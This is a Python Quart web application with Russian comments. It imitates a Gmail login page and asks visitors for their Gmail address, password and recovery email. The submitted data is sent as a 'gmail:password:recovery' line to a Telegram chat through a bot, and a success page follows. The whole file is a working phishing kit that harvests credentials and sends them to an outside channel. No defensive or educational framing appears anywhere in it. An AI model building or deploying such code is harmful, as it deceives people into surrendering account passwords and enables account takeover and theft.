from quart import Quart, render_template, redirect, url_for
from quart_wtf import QuartForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Email
from aiogram import Bot
import asyncio
import os
import logging

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация Quart
app = Quart(__name__)
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "your-secret-key")

# Токен Telegram-бота и CHAT_ID из переменных окружения
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Инициализация Telegram-бота
telegram_bot = Bot(token=TELEGRAM_TOKEN)

# Асинхронная функция для отправки сообщения в Telegram
async def send_telegram_message(text):
    try:
        await telegram_bot.send_message(chat_id=CHAT_ID, text=text)
        logger.info(f"Message sent to Telegram: {text}")
    except Exception as e:
        logger.error(f"Failed to send message to Telegram: {e}")

# Определение формы
class LoginForm(QuartForm):
    gmail = StringField('Your Gmail account', 
                        validators=[DataRequired(), Email()], 
                        render_kw={"placeholder": "Your Gmail account", "type": "email"})
    password = PasswordField('Password gmail.com', 
                            validators=[DataRequired()], 
                            render_kw={"placeholder": "Password gmail.com", "type": "password"})
    recovery_email = StringField('Secondary email recovery', 
                                validators=[DataRequired()], 
                                render_kw={"placeholder": "Secondary email recovery", "type": "text"})
    submit = SubmitField('login')

# Маршрут для формы 00
@app.route('/', methods=['GET', 'POST'])
async def show_form():
    form = await LoginForm.create_form()
    if await form.validate_on_submit():
        gmail = form.gmail.data
        password = form.password.data
        recovery_email = form.recovery_email.data
        
        if not gmail.endswith('@gmail.com'):
            return await render_template('form.html', form=form, error="Please use a Gmail address")
        
        # Формируем сообщение для Telegram
        message = f"\n{gmail}:{password}:{recovery_email}"
        
        # Отправляем сообщение в Telegram
        await send_telegram_message(message)
        
        return await render_template('success.html', 
                                   gmail=gmail, 
                                   password=password, 
                                   recovery_email=recovery_email)
    
    return await render_template('form.html', form=form)

if __name__ == '__main__':
    port = int(os.getenv("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
